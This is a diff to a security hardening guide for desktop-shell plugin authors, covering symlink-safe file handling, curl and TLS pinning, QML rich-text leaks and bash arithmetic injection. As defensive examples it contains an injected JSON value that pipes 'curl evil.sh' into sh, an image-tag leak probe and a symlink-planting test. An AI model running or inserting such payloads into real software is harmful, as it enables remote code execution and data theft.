@@ -119,6 +119,26 @@ Fix: walk from a trusted anchor with `openat(O_RDONLY|O_DIRECTORY|O_NOFOLLOW|O_C
 
 `/tmp/<plugin>`, `/tmp/<plugin>-$UID`, `/dev/shm/...`, `${XDG_RUNTIME_DIR:-/tmp}`, and a hard-coded `/run/user/1000`. Another account pre-creates the path, reads your snapshots, owns your socket, or replaces a script between write and execution. Fix: prefer stdout with no file. Otherwise `: "${XDG_RUNTIME_DIR:?}"` and fail closed, or `mktemp -d` with a trap; verify an existing directory component by component; use `$XDG_STATE_HOME`/`$XDG_CACHE_HOME` for persistent state. Never wildcard-delete in `/tmp`.
 
+### Repair the directory unconditionally, and its contents too
+
+Putting the `chmod` inside `if [[ "$mode" != "700" ]]` reads logically and is wrong. The mode of the directory says nothing about the files in it: a directory that is 700 today can hold 644 files from an earlier version, and those are then never repaired. Worse, a directory that was ever wider can hold entries you did not put there, and a symlink on the fixed name of your cache file sends every later write to a file the planter chose. Closing the directory does not clean that up. So the repair runs every time and removes anything that is not a regular file (`find` uses `lstat`, so a symlink is `-type l`):
+
+```bash
+find "$dir" -mindepth 1 -maxdepth 1 ! -type f -exec rm -rf -- {} + 2>/dev/null
+find "$dir" -mindepth 1 -maxdepth 1 -type f -exec chmod 600 -- {} + 2>/dev/null
+```
+
+Test the write path, because it takes two lines and reviewers do exactly this:
+
+```bash
+echo "must survive" > /tmp/victim
+ln -sf /tmp/victim ~/.cache/my-plugin/cache.json
+my-script list >/dev/null
+cat /tmp/victim     # unchanged? then the write is safe
+```
+
+One bash trap when you move these helpers around: a function exists only *after* its definition, and `private_dir "$X" || return 0` near the top of a script swallows "command not found" as an ordinary false. The script then runs on as if nothing is wrong, only without ever reading your config.
+
 ### Smaller members of the same family
 
 - **Lock and PID files**: `exec 9>"$lock"` before `flock` truncates through a symlink. Open the lock `O_CREAT|O_NOFOLLOW` 0600 in the verified runtime directory and validate it on the descriptor, or `flock` a read-only descriptor of the existing file.
@@ -152,7 +172,12 @@ printf '%s' "$text" | wtype -
 printf '%s' "$token" | secret-tool store --label='...' service myplugin
 ```
 
-In QML use `stdinEnabled: true` and `proc.write(...)` on the one process that needs it. `curl -q` (or `--disable`) must be the first option, or `~/.curlrc` can add a second URL or redirect and the `-H @-` header goes there too. `~/.curlrc` is a same-user file, but because a credential is on the line reviewers grade a missing `-q` as a blocker, not as hardening. Turn `set -x` off around the call: bash tracing prints the words of every command to stderr, and the widget's stderr lands in the journal. Verify with `cat /proc/$(pgrep -n curl)/cmdline | tr '\0' ' '` while a request is running. If an upstream CLI only takes the secret as an argument, reviewers expect you to remove that feature or compute it locally (TOTP via `hmac`/`hashlib` was the accepted answer).
+In QML use `stdinEnabled: true` and `proc.write(...)` on the one process that needs it. `curl -q` (or `--disable`) must be the first option, or `~/.curlrc` can add a second URL or redirect and the `-H @-` header goes there too. `~/.curlrc` is a same-user file, but because a credential is on the line reviewers grade a missing `-q` as a blocker, not as hardening. Turn `set -x` off around the call: bash tracing prints the words of every command to stderr, and the widget's stderr lands in the journal.
+
+```bash
+untrace() { case "$-" in *x*) TRACED=1; set +x ;; *) TRACED=0 ;; esac; }
+retrace() { (( TRACED )) && set -x; return 0; }
+``` Verify with `cat /proc/$(pgrep -n curl)/cmdline | tr '\0' ' '` while a request is running. If an upstream CLI only takes the secret as an argument, reviewers expect you to remove that feature or compute it locally (TOTP via `hmac`/`hashlib` was the accepted answer).
 
 ### Files holding credentials or private content (~150 comments)
 
@@ -214,6 +239,8 @@ A 1 MiB response still holds tens of thousands of valid objects or one huge stri
 
 The single most reported finding. A `Text`, `Label`, `TextEdit` or Quattro component without `textFormat` sits on `Text.AutoText`: Qt sniffs the string and renders it as rich text if it looks like markup. Rich text loads `<img src="...">`, which is a real HTTP or `file:` request from the shell process to a location the string's author picks. This is verified, not theoretical, and every value you did not type is a candidate: API fields, MPRIS metadata, window titles and app ids, `.desktop` names, device, SSID and Bluetooth names, filenames, ICS summaries, clipboard, helper stderr, error messages, stored notes, other plugins' manifests. `elide`, `maximumLineCount`, tag strippers, `html.unescape()` and truncation do not change how the value is interpreted. Reviewers grep-count `textFormat` ("0 of 32 across `Panel.qml`") and a fix that misses one sink is re-blocked.
 
+You can verify the mechanism without the shell: put `<img src="http://127.0.0.1:PORT/leak.png">` in a default `Text`, run `QT_QPA_PLATFORM=offscreen qml6 test.qml` with a listener on that port, and watch the `GET /leak.png` arrive.
+
 Fix: `textFormat: Text.PlainText` on every `Text`, including literal-only ones so the invariant is auditable, plus length and control-character caps at ingestion. Where styling is genuinely needed, use `Text.RichText` only with every variable escaped (`&` first, then `<`, `>`) and colours from a fixed table, or split into several PlainText items. A Markdown renderer must reject raw HTML and images; a denylist of a few tag shapes is "insufficient at this trust boundary". Audit mechanically:
 
 ```bash
@@ -250,6 +277,20 @@ MPRIS `artUrl`, API thumbnails, notification icons, tray icons, `data:` URIs, `f
 
 Fix: remove the shell. `Process.command` and `Quickshell.execDetached` take arrays; every value is its own element. If a script must stay, it is a constant and takes `"$1"`, `"$2"` or `environment`. Pass data to Python and jq via argv or stdin (`jq --arg`, `jq -Rn`), never by interpolation. Values that reach `hyprctl eval` or `dispatch` are integers, `true`/`false`, `^0x[0-9a-f]+$` addresses, names from a closed allowlist, or `luaQuote`d then `shellQuote`d in that order. Validate with an anchored regex at parse time and again before use; refuse, do not repair.
 
+### Bash arithmetic evaluates its input twice
+
+Inside `$(( ))`, `[ x -gt y ]`, `let` and `declare -i`, bash reads the *contents* of a name and evaluates that again as arithmetic, and an array subscript there is a command substitution. If the server answers `"expires_in": "a[$(curl evil.sh|sh)]+3600"`, the command runs and a plausible number still comes out, so you see nothing. This was a real blocker on a token-refresh script. Put anything that will be arithmetic through a filter first, or parse in Python where a non-number is just a failed `int()`:
+
+```bash
+number_or() {
+  local value="$1" fallback="$2"
+  case "$value" in ''|*[!0-9]*) printf '%s' "$fallback"; return 0 ;; esac
+  [ "${#value}" -le 12 ] || { printf '%s' "$fallback"; return 0; }
+  printf '%s' "$((10#$value))"
+}
+sleep_until=$(( $(date +%s) + $(number_or "$expires_in" 300) ))
+```
+
 ### Executables and environment (~180 comments)
 
 Bare `hyprctl`, `jq`, `curl`, `python3`, `#!/usr/bin/env bash`, `shutil.which()`, `command -v`, `~/.local/bin` fallbacks, and executable overrides from environment variables resolve through a PATH another process can prepend to. `bash -lc` reads profiles; a non-interactive bash still honours `BASH_ENV`; `PYTHONPATH`, `PERL5OPT`, `GIT_DIR` and `LD_PRELOAD` ride in with the inherited environment. Since the September policy this is hardening for same-UID-only cases, but it stays a blocker wherever a credential or privilege boundary is involved (a shadow `curl` receives the bearer token). Fix: absolute `/usr/bin/...` paths, `clearEnvironment: true` with an explicit minimal environment (`HOME`, `XDG_RUNTIME_DIR`, a fixed `PATH`), `/usr/bin/python3 -I -S` for the system interpreter (for a venv interpreter at a fixed plugin-owned path use `-I` alone, since `-S` drops the site-packages the venv exists for), bundled helpers resolved from the manifest directory (`manifest.__sourceDir` and `Qt.resolvedUrl("bin/...")` relative to the plugin file are both accepted), and a hostile-PATH regression test. The rule covers every executable on the credential path, not only the one that receives the secret: the `openssl` that computes a certificate pin decides whether the key goes out at all.
@@ -265,7 +306,18 @@ Bare `hyprctl`, `jq`, `curl`, `python3`, `#!/usr/bin/env bash`, `shutil.which()`
 ## 6. Network and TLS
 
 - **Redirects with credentials** (~130 comments): `urllib`'s default handler and `curl -L` forward `Authorization` to whatever host a 30x names, including HTTPS to HTTP. Refuse redirects on credentialed requests (a `HTTPRedirectHandler` whose `redirect_request` returns `None`, curl without `-L`), or revalidate every hop against the exact `(scheme, host, port)` and strip credentials on any change. `--proto-redir =https` restricts only the scheme.
-- **Plain HTTP with a secret** (~60 comments): accepting `http://` base URLs, `curl -k`, `verify=False`, `ssl._create_unverified_context()`, mpv `tls_verify=0`, `/cert:ignore`, defaulting to `http://ip-api.com`. Enforce HTTPS in code, allow HTTP only for a literal loopback address, never make verification disableable. For a LAN device with a self-signed certificate pin the fingerprint or public key in an explicit first-use flow (`curl --pinnedpubkey`) and reject changes; do not offer an insecure fallback.
+- **Plain HTTP with a secret** (~60 comments): accepting `http://` base URLs, `curl -k`, `verify=False`, `ssl._create_unverified_context()`, mpv `tls_verify=0`, `/cert:ignore`, defaulting to `http://ip-api.com`. Enforce HTTPS in code, allow HTTP only for a literal loopback address, never make verification disableable. For a LAN device with a self-signed certificate pin the fingerprint or public key in an explicit first-use flow (`curl --pinnedpubkey`) and reject changes; do not offer an insecure fallback. The address of a device on a DHCP lease is a guess about who is listening, not a statement about who they are, so check the pin *before* the credential goes on the wire:
+
+```python
+ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+ctx.check_hostname = False        # CN is a serial number, not a hostname
+ctx.verify_mode = ssl.CERT_NONE   # replaced by the narrower check below
+sock = ctx.wrap_socket(raw)       # handshake: nothing secret has gone out yet
+if sha256(sock.getpeercert(binary_form=True)).hexdigest() != pinned:
+    raise Untrusted()             # only now send the credential
+```
+
+`CERT_NONE` here is not a weakness but the replacement of hostname verification with something stricter: exactly one certificate is allowed, the one a person looked at during setup. Re-pinning is an explicit, interactive step that shows the old and the new fingerprint, never automatic.
 - **SSRF and DNS rebinding** (~90 comments): any configurable or response-supplied URL can point at loopback, RFC1918, link-local, `.local`, or resolve differently between your check and the connection. Resolve, reject every non-global address, pin the validated address to the connection (`curl --resolve`) while keeping Host and SNI, and repeat per hop; disable environment proxies (`ProxyHandler({})`, `--noproxy '*'`); parse addresses with a real IP parser (`127.999.999.999` passed a regex).
 - **Fixed origins**: keep API bases as constants. A configurable `apiUrl` that receives the stored token is a blocker unless it is a prominent, consented development override with no credential reuse.
 - **curl hygiene**: `curl -q` first, `--proto =https --proto-redir =https`, `--max-time`, `--max-filesize` plus `head -c`, `--data-raw` so a leading `@` stays literal, URL as its own argument after `--`.
@@ -327,6 +379,7 @@ Bare `hyprctl`, `jq`, `curl`, `python3`, `#!/usr/bin/env bash`, `shutil.which()`
 
 ## 15. Repository hygiene
 
+- No real device identifiers in the README or screenshots: serial numbers, certificate fingerprints, MAC addresses, account IDs. Use plausible placeholders; reviewers read READMEs as a privacy question.
 - Leaked tokens and dev artifacts (`.gstack/`, `.wrangler/`, `__pycache__`, capture corpora, a 43 MiB GIF) get the tree blocked; revoke and rotate, remove, add ignore rules.
 - Hard-coded home paths (`/home/you/...`) break every other user and reviewers catch them; resolve helpers from `manifest.__sourceDir` or the plugin directory.
 - Manifest ID, `moduleName`, `ipcTarget`, README commands and install paths must agree; never reuse a built-in namespace like `omarchy.clock` (it collides with the stock widget's settings and IPC); a reserved or retired ID cannot be reused; `schemaVersion`, not `schemaversion`; no clone-only `omarchy.clonedFrom` unless it names the upstream SHA.
@@ -362,14 +415,14 @@ console.log(r.outcome, JSON.stringify(r.findings, null, 2), JSON.stringify(r.cap
 - **Updates**: a listed plugin's newer commit is published through the `[Verify]` form with the full SHA; the ID must match the listing; changing form headings breaks the parser; the SHA in a comment does not retarget the request.
 - **Duplicates, moves, forks**: one issue per repository; a renamed or transferred repository needs a new submission; a fork or `clonedFrom` inherits every upstream finding and should record the upstream SHA.
 - **Wording that works in your reply**: the exact commit, each finding listed as closed (not moved) with file and line, tests added for the race that was reported. Reviewers verify "the flow that actually runs", diff the claimed fix commit, grep-count `textFormat`, measure Quickshell behaviour, and treat an inaccurate claim as a new finding.
-- One finding on one of your plugins applies to all of them; reviewers compare an author's other submissions. Fix the class across your repositories before the re-check.
+- One finding on one of your plugins applies to all of them; reviewers compare an author's other submissions. Fix the class across your repositories before the re-check, and put a link to the reporter's comment in the commit message so the re-check can see what was addressed.
 
 ## Pre-submission checklist
 
 Files and state
 - [ ] Every read of a file the plugin did not just create goes through a single `O_NOFOLLOW|O_NONBLOCK` descriptor, `fstat`-validated, read `cap + 1`
 - [ ] Every write is an exclusive random temporary in the destination directory, 0600 from creation, `fsync`, `rename`, directory `fsync`
-- [ ] Parent directories are walked with held descriptors; no `mkdir -p` on a chain you then trust
+- [ ] Parent directories are walked with held descriptors; no `mkdir -p` on a chain you then trust; the permission repair runs unconditionally and removes non-regular entries
 - [ ] No fixed `/tmp` paths, no `${XDG_RUNTIME_DIR:-/tmp}`; fail closed instead
 - [ ] `FileView` is watcher-only (`preload: false`, `blockAllReads: true`)
 - [ ] Traversal, deletion and archive extraction are bounded to an opened root and reject `..`, symlinks and special files
@@ -392,6 +445,7 @@ QML
 
 Commands and network
 - [ ] All processes are argv arrays; any `sh -c` is a constant script taking `$1`; nothing external inside `hyprctl eval` strings without a closed grammar
+- [ ] No external value in `$(( ))`, `[ x -gt y ]`, `let` or `declare -i`
 - [ ] `--` before every data argument; option-shaped values rejected; URLs parsed and host-allowlisted before `xdg-open`
 - [ ] Absolute executable paths and `clearEnvironment: true` wherever a secret or privilege is involved
 - [ ] HTTPS only, redirects refused on credentialed requests, non-global addresses rejected and pinned, fixed API origins
@@ -409,7 +463,7 @@ Config, IPC, agents, removal, repo
 - [ ] No `AGENTS.md`, `CLAUDE.md`, `.claude`, `.codex`, `.agents` in the tree; no tool-enabled agent invocation on untrusted text
 - [ ] README: every endpoint, every file written, a Removing section with the real `omarchy plugin remove <id>` and what survives; claims match code
 - [ ] Removal stops daemons, revokes grants, restores state, deletes only proven-owned paths
-- [ ] No leaked tokens or dev artifacts, no hard-coded home paths, no file over 512 KiB, no NUL bytes, preview named `preview.png`, licence present, IDs consistent
+- [ ] No real serial numbers, fingerprints or account IDs in the README; no leaked tokens or dev artifacts, no hard-coded home paths, no file over 512 KiB, no NUL bytes, preview named `preview.png`, licence present, IDs consistent
 - [ ] Local baseline run says `passed`; all fixes on one commit; issue body edited to trigger validation
 
 ## Appendix: helpers reviewers have accepted
